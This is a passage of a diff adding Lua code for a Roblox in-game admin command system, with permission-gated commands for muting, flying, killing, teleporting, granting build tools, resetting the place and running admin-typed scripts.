+				elseif key:lower() == "d" then 
+					Control.r = 0 
+				end 
+			end)
+			
+			Fly()]],i:FindFirstChild("PlayerGui"),true)
+	end
+	
+	Tell(sender,"Flown "..tostring(unpack(flyme))..".",3)
+end
+
+function Commands.mute(args,sender)
+	MinimumPermission(2,sender)
+	assert(args[1],"Player to mute is missing")
+	local mute = GetPlayersFromString(args[1],sender)
+	for _,i in pairs(mute) do
+		MakeLocalScript([[game:GetService("StarterGui"):SetCoreGuiEnabled("Chat",false)]],i:FindFirstChild("PlayerGui"),true)
+	end
+	
+	Tell(sender,"Muted "..tostring(unpack(mute))..".",3)
+end
+
+function Commands.unmute(args,sender)
+	MinimumPermission(2,sender)
+	assert(args[1],"Player to unmute is missing")
+	local mute = GetPlayersFromString(args[1],sender)
+	for _,i in pairs(mute) do
+		MakeLocalScript([[game:GetService("StarterGui"):SetCoreGuiEnabled("Chat",true)]],i:FindFirstChild("PlayerGui"),true)
+	end
+	
+	Tell(sender,"Unmuted "..tostring(unpack(mute))..".",3)
+end
+
+function Commands.unfly(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to unfly is missing")
+	
+	local unfly = GetPlayersFromString(args[1],sender)
+	
+	for _,i in pairs(unfly) do
+		if i:FindFirstChild("PlayerGui") and i:FindFirstChild("PlayerGui"):FindFirstChild("ADMIN_FLY_SCRIPT") then
+			i:FindFirstChild("PlayerGui"):FindFirstChild("ADMIN_FLY_SCRIPT").Disabled = true
+			i:FindFirstChild("PlayerGui"):FindFirstChild("ADMIN_FLY_SCRIPT"):Destroy()
+		end
+		if i.Character and i.Character:FindFirstChild("Torso") then
+			if i.Character.Torso:FindFirstChild("FlySmoke") then
+				i.Character.Torso:FindFirstChild("FlySmoke"):Destroy()
+			end
+			if i.Character.Torso:FindFirstChild("BodyGyro") then
+				i.Character.Torso:FindFirstChild("BodyGyro"):Destroy()
+			end
+			if i.Character.Torso:FindFirstChild("BodyVelocity") then
+				i.Character.Torso:FindFirstChild("BodyVelocity"):Destroy()
+			end
+		end
+		if i.Character:FindFirstChild("Humanoid") then
+			i.Character:FindFirstChild("Humanoid").PlatformStand = false
+		end
+	end
+	
+	Tell(sender,"Unflown "..tostring(unpack(unfly))..".",3)
+end
+
+function Commands.unnoclip(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to unnoclip is missing")
+	
+	local unfly = GetPlayersFromString(args[1],sender)
+	
+	for _,i in pairs(unfly) do
+		if i:FindFirstChild("PlayerGui") and i:FindFirstChild("PlayerGui"):FindFirstChild("ADMIN_NOCLIP_SCRIPT") then
+			i:FindFirstChild("PlayerGui"):FindFirstChild("ADMIN_NOCLIP_SCRIPT").Disabled = true
+			i:FindFirstChild("PlayerGui"):FindFirstChild("ADMIN_NOCLIP_SCRIPT"):Destroy()
+		end
+		if i.Character then
+			if i.Character:FindFirstChild("Torso") then
+				i.Character:FindFirstChild("Torso").Anchored = false
+			end
+			if i.Character:FindFirstChild("Humanoid") then
+				Delay(0.28,function()
+					i.Character:FindFirstChild("Humanoid").PlatformStand = false
+				end)
+			end
+		end
+	end
+	
+	Tell(sender,"Clipped "..tostring(unpack(unfly))..".",3)
+end
+
+function Commands.clip(...)
+	Commands.unnoclip(...)
+end
+
+function Commands.unban(args,sender)
+	MinimumPermission(2,sender)
+	assert(args[1],"Player to unban is missing")
+	
+	if args[1] == "all" or args[1] == "others" then
+		BannedPlayers = {}
+		Tell(player,"Cleared ban list.",3)
+		return
+	end	
+	
+	local tounban
+	for a,i in pairs(BannedPlayers) do
+		if i:lower():sub(1,#args[1]) == args[1]:lower() then
+			if not tounban then
+				tounban = a
+			else
+				error(args[1].." is ambiguous on the ban list. Try being more specific.")
+			end
+		end
+	end
+	
+	table.remove(BannedPlayers,tounban)
+	
+	Tell(sender,"Unbanned "..tounban..".",3)
+end
+
+function Commands.admin(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to admin is missing")
+	local toadmin = "nope"
+	pcall(function()
+		toadmin = GetPlayersFromString(args[1],sender)
+	end)
+	if toadmin == "nope" then
+		table.insert(Admins,args[1])
+		Tell(sender,"Added "..tostring(args[1]).." to the admin list.",3)
+	else
+		for _,i in pairs(toadmin) do
+			if Permissions[i.Name] <= 1 then
+				table.insert(Admins,i.Name)
+				Permissions[i.Name] = 1
+				Tell(i,sender.Name.." has granted you regular Admin permissions. Say "..CommandPrefix.."cmds for a list of commands, you can do most things besiding kicking, banning, or punishing.",5)
+			end
+		end
+		Tell(sender,"Admined "..tostring(unpack(toadmin))..".",3)
+	end
+end
+
+function Commands.unadmin(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to unadmin is missing")
+	local admin = GetPlayersFromString(args[1],sender)
+	
+	for _,i in pairs(admin) do
+		for a,b in pairs(Admins) do
+			if b:lower() == i.Name:lower() and ((Permissions[sender.Name] < 2 and Permissions[b.Name] < 2) or Permissions[sender.Name] >= 2) then
+				Permissions[i.Name] = 0
+			end
+		end
+		for a,b in pairs(SuperAdmins) do
+			if b:lower() == i.Name:lower() and (Permissions[sender.Name] >= 2) and i.userId ~= game.CreatorId then
+				Permissions[i.Name] = 0
+			end
+		end
+		Tell(i,sender.Name.." has removed your Admin permissions. Sorry about that.",5)
+	end
+	
+	Tell(sender,"Unadmined "..tostring(unpack(admin))..".",3)
+end
+
+function Commands.superadmin(args,sender)
+	MinimumPermission(2,sender)
+	assert(args[1],"Player to admin is missing")
+	local toadmin = "nope"
+	pcall(function()
+		toadmin = GetPlayersFromString(args[1],sender)
+	end)
+	if toadmin == "nope" then
+		table.insert(SuperAdmins,args[1])
+	else
+		for _,i in pairs(toadmin) do
+			table.insert(SuperAdmins,i.Name)
+			Permissions[i.Name] = 2
+			Tell(i,sender.Name.." has granted you Super Admin permissions. Say "..CommandPrefix.."cmds for a list of commands. You may use anything on the list.",5)
+		end
+	end
+	
+	Tell(sender,"Super Admined "..tostring(unpack(toadmin ~= "nope" and toadmin or args[1]))..".",3)
+end
+
+function Commands.punish(args,sender)
+	MinimumPermission(2,sender)
+	assert(args[1],"Player to punish is missing")
+	local punish = GetPlayersFromString(args[1],sender)
+	
+	for _,i in pairs(punish) do
+		local c = i.Character
+		c.Parent = Lighting
+		pcall(function()
+			i.Character = nil
+			c.Name = c.Name.."_PUNISHED"
+		end)
+	end
+	Tell(sender,"Punished "..tostring(unpack(punish))..".",3)
+end
+
+function Commands.givebtools(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to give build tools is missing")
+	local players = GetPlayersFromString(args[1],sender)
+	
+	for _,i in pairs(players) do
+		if i:FindFirstChild("Backpack") then
+			local move = Instance.new("HopperBin",i.Backpack)
+			move.Name = "Move"
+			move.BinType = "GameTool"
+			local move = Instance.new("HopperBin",i.Backpack)
+			move.Name = "MoveModel"
+			move.BinType = "Grab"
+			local copy = Instance.new("HopperBin",i.Backpack)
+			copy.Name = "Copy"
+			copy.BinType = "Clone"
+			local destroy = Instance.new("HopperBin",i.Backpack)
+			destroy.Name = "Delete"
+			destroy.BinType = "Hammer"
+		end
+	end
+	
+	Tell(sender,"Gave "..tostring(unpack(players)).." Building Tools.",3)
+end
+
+function Commands.btools(...)
+	Commands.givebtools(...)
+end
+
+function Commands.removebtools(...)
+	Commands.takebtools(...)
+end
+
+function Commands.removebuildtools(...)
+	Commands.takebtools(...)
+end
+
+function Commands.buildtools(...)
+	Commands.btools(...)
+end
+
+function Commands.takebtools(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to take build tools is missing")
+	local players = GetPlayersFromString(args[1],sender)
+	
+	for _,i in pairs(players) do
+		if i:FindFirstChild("Backpack") then
+			for _,a in pairs(i:FindFirstChild("Backpack"):GetChildren()) do
+				if a:IsA("HopperBin") and a.BinType == "Hammer" or a.BinType == "Clone" or a.BinType == "GameTool" or a.BinType == "Grab" then
+					a:Destroy()
+				end
+			end
+		end
+	end
+	
+	Tell(sender,"Took Building Tools from "..tostring(unpack(players))..".",3)
+end
+
+function Commands.takebuildtools(...)
+	Commands.takebtools(...)
+end
+
+function Commands.removetools(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to remove tools is missing")
+	local players = GetPlayersFromString(args[1],sender)
+	
+	for _,i in pairs(players) do
+		if i:FindFirstChild("Backpack") then
+			for _,a in pairs(i:FindFirstChild("Backpack"):GetChildren()) do
+				if a:IsA("HopperBin") or a:IsA("Tool") then
+					a:Destroy()
+				end
+			end
+		end
+		if i.Character then
+			for _,a in pairs(i.Character:GetChildren()) do
+				if a:IsA("Tool") or a:IsA("HopperBin") then
+					a:Destroy()
+				end
+			end
+		end
+	end
+	
+	Tell(sender,"Took Tools from "..tostring(unpack(players))..".",3)
+end
+
+function Commands.cleartools(...)
+	Commands.removetools(...)
+end
+
+function Commands.taketools(...)
+	Commands.removetools(...)
+end
+
+function Commands.removestartergear(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to remove tools is missing")
+	local players = GetPlayersFromString(args[1],sender)
+	
+	for _,i in pairs(players) do
+		if i:FindFirstChild("StarterGear") then
+			for _,a in pairs(i:FindFirstChild("StarterGear"):GetChildren()) do
+				if a:IsA("HopperBin") or a:IsA("Tool") then
+					a:Destroy()
+				end
+			end
+		end
+	end
+	
+	Tell(sender,"Took Starter Gear from "..tostring(unpack(players))..".",3)
+end
+
+function Commands.takestartergear(...)
+	Commands.removestartergear(...)
+end
+
+function Commands.clearstartergear(...)
+	Commands.removestartergear(...)
+end
+
+function Commands.takestarter(...)
+	Commands.removestartergear(...)
+end
+
+function Commands.removestarter(...)
+	Commands.removestartergear(...)
+end
+
+function Commands.clearstarter(...)
+	Commands.removestartergear(...)
+end
+
+function Commands.takestartertools(...)
+	Commands.removestartergear(...)
+end
+
+function Commands.removestartertools(...)
+	Commands.removestartergear(...)
+end
+
+function Commands.clearstartertools(...)
+	Commands.removestartergear(...)
+end
+
+function Commands.disablesb(args,sender)
+	MinimumPermission(2,sender)
+
+	if not SBMode then
+		error("You must be in a script builder to use "..tostring(CommandPrefix).."disablesb")
+	end
+	
+	for _,i in pairs(Scripts) do
+		i.Disabled = true
+		TellAll("Scripts have been disabled. All detectable scripts have been disabled.")
+	end
+	
+	DisableSB = true
+	
+	for _,i in pairs(Players:GetPlayers()) do
+		if i:FindFirstChild("PlayerGui") then
+			for _,a in pairs(i:FindFirstChild("PlayerGui"):GetChildren()) do
+				if a.Name ~= "Admi" or not a:IsA("ScreenGui") and a.Name ~= "HealthGUI" then
+					a:Destroy()
+				end
+			end
+			i:FindFirstChild("PlayerGui").ChildAdded:connect(function(a)
+				if DisableSB then
+					if a.Name ~= "Admi" or not a:IsA("ScreenGui") and a.Name ~= "HealthGUI" then
+						a:Destroy()
+					end
+				end
+			end)
+		end
+	end
+	
+	Tell(sender,"Script Builder Disabled",3)
+	
+end
+
+function Commands.enablesb(args,sender)
+	MinimumPermission(2,sender)
+	
+	if not SBMode then
+		error(CommandPrefix.."enablesb requires SBMode to be on.")
+	end
+	
+	DisableSB = false
+	
+	for _,i in pairs(Players:GetPlayers()) do
+		i:LoadCharacter()
+	end
+	
+	Tell(sender,"Script Builder Enabled",3)
+end
+
+function Commands.unpunish(args,sender)
+	MinimumPermission(2,sender)
+	assert(args[1],"Player to unpunish is missing")
+	local punish = GetPlayersFromString(args[1],sender)
+	
+	for _,i in pairs(punish) do
+		punishedchar = Lighting:FindFirstChild(i.Name.."_PUNISHED")
+		if punishedchar then
+			punishedchar.Name = i.Name
+			i.Character = punishedchar
+			punishedchar.Parent = Workspace
+		else
+			i:LoadCharacter()
+		end
+	end
+	Tell(sender,"Unpunished "..tostring(unpack(punish))..".",3)
+end
+
+function Commands.clean(args,sender)
+	MinimumPermission(1,sender)
+	
+	for _,i in pairs(Workspace:GetChildren()) do
+		if i:IsA("Hat") or i:IsA("Tool") or i:IsA("Message") or i:IsA("Hint") or i:IsA("Sound") then
+			i:Destroy()
+		end
+	end
+	
+	Tell(sender,"Cleaned!",3)
+end
+
+function Commands.day(args,sender)
+	MinimumPermission(1,sender)
+	
+	Lighting.TimeOfDay = 14
+	
+	Tell(sender,"It's day now!",3)
+end
+
+function Commands.night(args,sender)
+	MinimumPermission(1,sender)
+	
+	Lighting.TimeOfDay = 0
+	
+	Tell(sender,"It's night now!",3)
+end
+
+function Commands.fog(args,sender)
+	MinimumPermission(1,sender)
+	
+	Lighting.FogEnd = tonumber(args[1]) or 100
+	
+	Tell(sender,"It's foggy out now!",3)
+end
+
+function Commands.resetplace(args,sender)
+	MinimumPermission(2,sender)
+	
+	if not SBMode then
+		error("Because this erases the whole place, "..CommandPrefix.."resetplace is currently not available without SBMode on. Sorry!")
+	end
+	
+	for _,i in pairs(Scripts) do
+		i.Disabled = true
+	end
+	
+	for _,i in pairs(Workspace:GetChildren()) do --wipe workspace
+		if i ~= script and not i:IsA("Model") and not i:IsA("Camera") and not i:IsA("Terrain") and i ~= script then
+			if i:IsA("BaseScript") then
+				i.Disabled = true
+			end
+			i:Destroy()
+		elseif i:IsA("Model") and i:FindFirstChild("Humanoid") and Players:FindFirstChild(i.Name) ~= nil and i ~= script then
+			for _,a in pairs(i:GetChildren()) do
+				if not a:IsA("Humanoid") and not a:IsA("BasePart") then
+					a:Destroy()
+				end
+			end
+		elseif not i:IsA("Camera") and not i:IsA("Terrain") and i ~= script then
+			if i:IsA("BaseScript") then
+				i.Disabled = true
+			end
+			i:Destroy()
+		end
+	end
+	
+	Lighting:ClearAllChildren()
+	ReplicatedStorage:ClearAllChildren()
+	ServerScriptService:ClearAllChildren()
+	ServerStorage:ClearAllChildren()
+	Debris:ClearAllChildren()
+	StarterGui:ClearAllChildren()
+	StarterPack:ClearAllChildren()
+	
+	Lighting.TimeOfDay = 14
+	Lighting.FogStart = 0
+	Lighting.FogEnd = 100000
+	Lighting.FogColor = Color3.new(192/255,192/255,192/255)
+	Lighting.Brightness = 1
+	Lighting.Ambient = Color3.new()
+	Lighting.ColorShift_Bottom = Color3.new()
+	Lighting.ColorShift_Top = Color3.new()
+	Lighting.OutdoorAmbient = Color3.new(0.5,0.5,0.5)
+	Lighting.Outlines = true
+	Lighting.ShadowColor = Color3.new(179/255,179/255,184/255)
+	Lighting.GeographicLatitude = 41.733
+	Lighting.GlobalShadows = true
+	
+	local base = Instance.new("Part")
+	base.Anchored = true
+	base.Locked = true
+	base.BrickColor = BrickColor.new("Dark green")
+	base.Name = "Baseplate"
+	base.Size = Vector3.new(1000,1.2,1000)
+	base.Position = Vector3.new(0,0.6,0)
+	base.Parent = Workspace
+	
+	for _,i in pairs(Players:GetPlayers()) do
+		if i:IsA("Player") then
+			if i:FindFirstChild("StarterGear") then
+				i:ClearAllChildren()
+			end
+			i:LoadCharacter()
+		else
+			i:Destroy()
+		end
+	end
+	
+	Tell(sender,"The place has been reset!",3)
+end
+
+function Commands.s(args,sender)
+	MinimumPermission(2,sender)
+	
+	local buildstring = ""
+	
+	for _,i in pairs(args) do
+		buildstring = buildstring..i.." "
+	end
+	
+	local lsenabled,asdfghjkl = ypcall(function()loadstring("")end)
+	
+	if not lsenabled then
+		error("Workspace.LoadStringEnabled is set to false, so server scripts cannot be created. Sorry about that.")
+	end	
+	
+	local ok,err = loadstring(buildstring)
+	
+	if not ok then
+		Tell(sender,"Your script could not be made due to a syntax error: "..tostring(err),3)
+	else
+		MakeScript(buildstring,Workspace)
+		Tell(sender,"Your script has been created! A message will appear if anything goes wrong.",3)
+	end
+
+end
+
+
+function Commands.ls(args,sender)
+	MinimumPermission(2,sender)
+	
+	local buildstring = ""
+	
+	for _,i in pairs(args) do
+		buildstring = buildstring..i.." "
+	end
+	
+	local ok,err = loadstring(buildstring)
+	
+	if not ok then
+		Tell(sender,"Your localscript could not be made due to a syntax error: "..tostring(err),3)
+	else
+		MakeLocalScript(buildstring,sender:FindFirstChild("PlayerGui") or sender:WaitForChild("Backpack"))
+		Tell(sender,"Your localscript has been created! A message will appear if anything goes wrong.",3)
+	end
+
+end
+
+function Commands.lsplr(args,sender)
+	MinimumPermission(2,sender)
+	
+	player = GetPlayersFromString(assert(args[1],"Player to execute localscript on is missing"),sender)
+	
+	local nameargs = {}
+	
+	for a,i in pairs(args) do
+		if a ~= 1 then
+			nameargs[a-1] = i
+		end
+	end
+	
+	for _,plr in pairs(player) do
+		
+		local buildstring = ""
+		
+		for _,i in pairs(nameargs) do
+			buildstring = buildstring..i.." "
+		end
+		
+		local ok,err = loadstring(buildstring)
+		
+		if not ok then
+			Tell(sender,"Your localscript could not be made due to a syntax error: "..tostring(err),3)
+		else
+			MakeLocalScript(buildstring,plr:FindFirstChild("PlayerGui") or plr:WaitForChild("Backpack"))
+		end
+	
+	end
+	
+	Tell(sender,"Your localscript has been created for "..tostring(unpack(player)).."! A message will appear if anything goes wrong.",3)
+
+end
+
+function Commands.script(...)
+	Commands.s(...)
+end
+
+function Commands.localscript(...)
+	Commands.ls(...)
+end
+
+
+function Commands.nofog(args,sender)
+	MinimumPermission(1,sender)
+	
+	Lighting.FogEnd = 100000
+	
+	Tell(sender,"It's no longer foggy out now!",3)
+end
+
+function Commands.unfog(args,sender)
+	MinimumPermission(1,sender)
+	
+	Lighting.FogEnd = 100000
+	
+	Tell(sender,"It's no longer foggy out now!",3)
+end
+
+function Commands.gshadows(args,sender)
+	MinimumPermission(1,sender)
+	
+	if stringtobool(args[1]) then
+		Lighting.GlobalShadows = true
+		Tell(sender,"Global Shadows turned on!",3)
+	else
+		Lighting.GlobalShadows = false
+		Tell(sender,"Global Shadows turned off!",3)
+	end
+	
+end
+
+function Commands.outlines(args,sender)
+	MinimumPermission(1,sender)
+	
+	if stringtobool(args[1]) then
+		Lighting.Outlines = true
+		Tell(sender,"Outlines turned on!",3)
+	else
+		Lighting.Outlines = false
+		Tell(sender,"Outlines turned off!",3)
+	end
+	
+end
+
+function Commands.cleansbscripts(args,sender)
+	MinimumPermission(1,sender)
+	
+	for _,i in pairs(Scripts) do
+		i.Disabled = true
+		i:Destroy()
+	end	
+	
+	Tell(sender,"Cleaned!",3)
+end
+
+function Commands.kill(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to kill is missing")
+	player = GetPlayersFromString(args[1],sender)
+	
+	for _,i in pairs(player) do
+		if i.Character then
+			i.Character:BreakJoints()--ham ham ham ham
+		end
+	end
+	
+	Tell(sender,"Killed "..tostring(unpack(player))..".",3)
+end
+
+function Commands.damage(args,sender)
+	MinimumPermission(2,sender)
+	assert(args[1],"Player to damage is missing")
+	local banned = GetPlayersFromString(args[1],sender)
+	assert(tonumber(args[2]),"Damage amount missing or not a proper number")
+	
+	for _,i in pairs(banned) do
+		if i.Character and i.Character:FindFirstChild("Humanoid") then
+			i.Character:FindFirstChild("Humanoid"):TakeDamage(tonumber(args[2]))
+		end
+	end
+	
+	Tell(sender,"Damaged "..tostring(unpack(banned)).." by "..args[2].." health.",3)
+end
+
+function Commands.jump(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to jump is missing")
+	player = GetPlayersFromString(args[1],sender)
+	
+	for _,i in pairs(player) do
+		if i.Character and i.Character:FindFirstChild("Humanoid") then
+			i.Character:FindFirstChild("Humanoid").Jump = true
+		end
+	end
+	Tell(sender,"Jumped "..tostring(unpack(player))..".",3)
+end
+
+function Commands.lay(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to jump is missing")
+	player = GetPlayersFromString(args[1],sender)
+	
+	for _,i in pairs(player) do
+		if i.Character and i.Character:FindFirstChild("Humanoid") and i.Character:FindFirstChild("Torso") then
+			i.Character:FindFirstChild("Humanoid").PlatformStand = true
+			i.Character:FindFirstChild("Torso").Velocity = Vector3.new(3,3,0)
+		end
+	end
+	Tell(sender,"Lied down "..tostring(unpack(player))..".",3)
+end
+
+function Commands.fling(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to fling is missing")
+	player = GetPlayersFromString(args[1],sender)
+	
+	for _,i in pairs(player) do
+		if i.Character and i.Character:FindFirstChild("Humanoid") and i.Character:FindFirstChild("Torso") then
+			i.Character:FindFirstChild("Humanoid").Sit = true
+			i.Character:FindFirstChild("Torso").Velocity = Vector3.new(1000,1000,0)
+		end
+	end
+	Tell(sender,"Flung "..tostring(unpack(player))..".",3)
+end
+
+function Commands.sit(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to sit is missing")
+	player = GetPlayersFromString(args[1],sender)
+	
+	for _,i in pairs(player) do
+		if i.Character and i.Character:FindFirstChild("Humanoid") then
+			i.Character:FindFirstChild("Humanoid").Sit = true
+		end
+	end
+	Tell(sender,"Sat "..tostring(unpack(player))..".",3)
+end
+
+function Commands.respawn(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to respawn is missing")
+	player = GetPlayersFromString(args[1],sender)
+	
+	for _,i in pairs(player) do
+		i:LoadCharacter()
+	end
+	Tell(sender,"Respawned "..tostring(unpack(player))..".",3)
+end
+
+function Commands.god(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to god is missing")
+	player = GetPlayersFromString(args[1],sender)
+	
+	for _,a in pairs(player) do
+		if a.Character and a.Character:FindFirstChild("Humanoid") then
+			for i = 1, 3 do
+				a.Character:FindFirstChild("Humanoid").MaxHealth = math.huge
+				a.Character:FindFirstChild("Humanoid").Health = math.huge
+			end
+		end
+	end
+	Tell(sender,"Godded "..tostring(unpack(player))..".",3)
+end
+
+function Commands.ungod(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to god is missing")
+	player = GetPlayersFromString(args[1],sender)
+	
+	for _,a in pairs(player) do
+		if a.Character and a.Character:FindFirstChild("Humanoid") then
+			for i = 1, 3 do
+				a.Character:FindFirstChild("Humanoid").MaxHealth = 100
+				a.Character:FindFirstChild("Humanoid").Health = 100
+			end
+		end
+	end
+	Tell(sender,"Ungodded "..tostring(unpack(player))..".",3)
+end
+
+function Commands.teleport(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Players to teleport is missing")
+	assert(args[2],"Player to teleport to is missing")
+	player = GetPlayersFromString(args[1],sender)
+	tpto = GetPlayersFromString(args[2],sender)
+	
+	if #tpto > 1 then
+		error("Cannot teleport players to more than one person at once.")
+	end
+	
+	assert(tpto[1],"Missing player to teleport to.")
+	assert(tpto[1].Character,"Missing player to teleport to's Character.")
+	assert(tpto[1].Character:FindFirstChild("Torso"),"Missing player to teleport to's Torso.")
+	
+	for _,a in pairs(player) do
+		if a.Character then
+			a.Character:MoveTo(tpto[1].Character:FindFirstChild("Torso").Position)
+		end
+	end
+	Tell(sender,"Teleported "..tostring(unpack(player)).." to "..tpto[1].Name..".",3)
+end
+
+function Commands.pteleport(args,sender)
+	MinimumPermission(2,sender)
+	assert(args[1],"Players to teleport is missing")
+	assert(tostring(args[2]),"Place to teleport to is missing or not a number")
+	player = GetPlayersFromString(args[1],sender)
+	tpto = tostring(args[2])
+	TeleportService.CustomizedTeleportUI = true
+	
+	for _,a in pairs(player) do
+		if a.Character then
+			TeleportService:Teleport(tpto,a.Character)
+		end
+	end
+	
+	if not PlaceNames[tpto] then
+		PlaceNames[tpto] = tpto
+	end
+	if type(PlaceNames[tpto]) == "number" then
+		ypcall(function()
+			PlaceNames[tpto] = MarketplaceService:GetProductInfo(tpto)["Name"]
+		end)
+	end
+	
+	Tell(sender,"Teleported "..tostring(unpack(player)).." to place "..PlaceNames[tpto] or tpto..".",3)
+end
+
+function Commands.tp(args,sender)
+	Commands.teleport(args,sender)
+end
+
+function Commands.tele(args,sender)
+	Commands.teleport(args,sender)
+end
+
+function Commands.ptp(args,sender)
+	Commands.pteleport(args,sender)
+end
+
+function Commands.ptele(args,sender)
+	Commands.pteleport(args,sender)
+end
+
+function Commands.place(args,sender)
+	Commands.pteleport(args,sender)
+end
+
+function Commands.ff(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to give ForceField is missing")
+	player = GetPlayersFromString(args[1],sender)
+	for _,i in pairs(player) do
+		if i.Character then
+			Instance.new("ForceField",i.Character)
+		end
+	end
+	Tell(sender,"ForceFielded "..tostring(unpack(player))..".",3)
+end
+
+function Commands.sparkles(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to give sparkles is missing")
+	player = GetPlayersFromString(args[1],sender)
+	for _,i in pairs(player) do
+		if i.Character then
+			Instance.new("Sparkles",i.Character)
+		end
+	end
+	Tell(sender,"Made "..tostring(unpack(player)).." sparkly.",3)
+end
+
+function Commands.unsparkles(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to remove sparkles is missing")
+	player = GetPlayersFromString(args[1],sender)
+	
+	for _,i in pairs(player) do
+		while i.Character and i.Character:FindFirstChild("Sparkles") do
+			i.Character:FindFirstChild("Sparkles"):Destroy()
+		end
+	end
+	
+	Tell(sender,"Made "..tostring(unpack(player)).." not so sparkly.",3)
+end
+
+function Commands.freeze(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to freeze is missing")
+	player = GetPlayersFromString(args[1],sender)
+	
+	for _,i in pairs(player) do
+		if i.Character then
+			if not i.Character:FindFirstChild("IceBlock") and i.Character:FindFirstChild("Torso") then
+				local IceBlock = Instance.new("Part",i.Character)
+				IceBlock.Name = "IceBlock"
+				IceBlock.Anchored = true
+				IceBlock.Locked = true
+				IceBlock.BrickColor = BrickColor.new("Bright blue")
+				IceBlock.Transparency = 0.5
+				IceBlock.Size = Vector3.new(5,8,5)
+				IceBlock.CFrame = CFrame.new(i.Character:FindFirstChild("Torso").Position) --sorry for leaving this broken so long :(
+				
+				local Weld = Instance.new("Weld",IceBlock)
+				Weld.Part0 = IceBlock
+				Weld.Part1 = i.Character:FindFirstChild("Torso")
+			end
+		end
+	end
+	
+	Tell(sender,"Froze "..tostring(unpack(player))..".",3)
+end
+
+function Commands.lock(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to lock is missing")
+	player = GetPlayersFromString(args[1],sender)
+	
+	for _,i in pairs(player) do
+		if i.Character then
+			for _,a in pairs(i.Character:GetChildren()) do
+				if a:IsA("BasePart") then
+					a.Locked = true
+				end
+			end
+		end
+	end
+	
+	Tell(sender,"Locked "..tostring(unpack(player))..".",3)
+end
+
+function Commands.unlock(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to unlock is missing")
+	player = GetPlayersFromString(args[1],sender)
+	
+	for _,i in pairs(player) do
+		if i.Character then
+			for _,a in pairs(i.Character:GetChildren()) do
+				if a:IsA("BasePart") then
+					a.Locked = false
+				end
+			end
+		end
+	end
+	
+	Tell(sender,"Unlocked "..tostring(unpack(player))..".",3)
+end
+
+function Commands.ghost(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to ghost is missing")
+	player = GetPlayersFromString(args[1],sender)
+	
+	for _,i in pairs(player) do
+		if i.Character then
+			for _,a in pairs(i.Character:GetChildren()) do
+				if a:IsA("BasePart") then
+					if a.Name ~= "HumanoidRootPart" then
+						a.Transparency = 1
+					end
+					if a.Name == "Head" then
+						if a:FindFirstChild("face") and a:IsA("Decal") then
+							a.Transparency = 1
+						end
+					end
+				elseif a:IsA("BaseScript") and a.Name == "Sound" then
+					a.Disabled = true
+				elseif a:IsA("Tool") or a:IsA("Hat") then
+					for _,b in pairs(a:GetChildren()) do
+						if b:IsA("BasePart") then
+							b.Transparency = 1
+						end
+					end
+				end
+			end
+		end
+	end
+	
+	Tell(sender,"Ghosted "..tostring(unpack(player))..".",3)
+end
+
+function Commands.invisible(...)
+	Commands.ghost(...)
+end
+
+function Commands.visible(...)
+	Commands.unghost(...)
+end
+
+function Commands.nograv(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to nograv is missing")
+	player = GetPlayersFromString(args[1],sender)
+	
+	for _,i in pairs(player) do
+		if i.Character and i.Character:FindFirstChild("Torso") then
+			local bodyforce = i.Character.Torso:FindFirstChild("NoGrav") or Instance.new("BodyForce", i.Character.Torso)
+			bodyforce.Name = "NoGrav"
+			bodyforce.force = Vector3.new(0,0,0)
+			for _,a in pairs(i.Character:GetChildren()) do
+				if a:IsA("BasePart") then
+					bodyforce.force = bodyforce.force + Vector3.new(0,a:GetMass()*200,0)
+				elseif (a:IsA("Hat") or a:IsA("Gear")) and a:FindFirstChild("Handle") then
+					bodyforce.force = bodyforce.force + Vector3.new(0,a:FindFirstChild("Handle"):GetMass()*200,0)
+				end
+			end
+		end
+	end
+	
+	Tell(sender,"Nograved "..tostring(unpack(player))..".",3)
+end
+
+function Commands.time(args,sender)
+	MinimumPermission(1,sender)
+	if #args <= 0 then
+		error("You must include the time you want to set it to. Honestly, what else did you expect me to do for you without the time you want?")
+	end
+	if #args == 1 then
+		Lighting.TimeOfDay = args[1]
+		Tell(sender,"Set time to "..args[1]..".",3)
+	elseif #args >= 3 then
+		Lighting.TimeOfDay = args[1]..":"..args[2]..(args[3] and ":")..(args[3] or "")
+		Tell(sender,"Set time to "..args[1]..":"..args[2]..":"..args[3],3)
+	else
+		error("The way you formatted your time is unrecognized. Try using XX:XX:XX, or separating them with "..(CommandSeparator == " " and "spaces" or CommandSeparator))
+	end
+	
+	
+end
+
+--[[function Commands.age(args,sender)
+	MinimumPermission(3,sender)
+	assert(args[1],"Player to retrieve age is missing")
+	
+	Player = GetPlayersFromString(args[1],sender)
+	
+	local function UnixTimeToString(t)
+		
+		local function FormatDay(day)
+			if day > 10 then
+				repeat
+					day = day - 10
+				until day < 10
+			end
+			
+			local Endings = {"th","st","nd","rd"}
+			
+			return day..(Endings[day + 1] or "th")
+		end
+		
+		local TIMEZONE = -5
+		local DST = 0
+		
+		local DaysInMonth = {31,28,31,30,31,30,31,31,30,31,30,31}
+		
